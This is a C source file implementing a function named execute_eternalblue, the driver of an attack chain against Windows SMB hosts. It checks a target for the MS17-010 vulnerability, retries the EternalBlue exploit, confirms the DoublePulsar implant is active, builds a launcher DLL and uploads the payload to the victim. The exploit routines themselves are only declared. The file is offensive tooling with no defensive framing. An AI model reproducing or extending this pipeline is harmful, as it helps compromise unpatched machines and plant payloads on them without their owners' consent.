#define _GNU_SOURCE
#include "config.h"

#include <stdio.h>

extern int ms17_vuln_status(const char *ip, int port);
extern int EternalBlue(const char *ip, int port);
extern int doublepulsar_check(const char *ip, int port);
extern int build_launcher_dll(const char *target_binary, const char *output_path);
extern int upload_payload(const char *ip, int port, const char *payload_path, int flag);

int execute_eternalblue(const char *ip, int port, const char *payload_path)
{
    int attempt;
    int exploit_succeeded = 0;

    (void)payload_path;

    printf("[execute_eternalblue] Checking MS17-010 vulnerability...\n");
    if (!ms17_vuln_status(ip, port)) {
        printf("[execute_eternalblue] Target is not vulnerable.\n");
        return -1;
    }

    for (attempt = 0; attempt < MAX_RETRIES; ++attempt) {
        printf("[execute_eternalblue] EternalBlue attempt %d of %d...\n",
               attempt + 1, MAX_RETRIES);
        if (EternalBlue(ip, port)) {
            exploit_succeeded = 1;
            break;
        }
    }
    if (!exploit_succeeded) {
        printf("[execute_eternalblue] EternalBlue failed after all retries.\n");
        return -2;
    }

    printf("[execute_eternalblue] Checking DoublePulsar status...\n");
    if (!doublepulsar_check(ip, port)) {
        printf("[execute_eternalblue] DoublePulsar is not active.\n");
        return -3;
    }

    printf("[execute_eternalblue] Building launcher DLL...\n");
    if (build_launcher_dll(TARGET_BINARY, PAYLOAD_DLL_PATH) != 0) {
        printf("[execute_eternalblue] Failed to build launcher DLL.\n");
        return -4;
    }

    printf("[execute_eternalblue] Uploading payload...\n");
    if (upload_payload(ip, port, PAYLOAD_DLL_PATH, 1) != 0) {
        printf("[execute_eternalblue] Failed to upload payload.\n");
        return -5;
    }

    printf("[execute_eternalblue] Pipeline completed successfully.\n");
    return 0;
}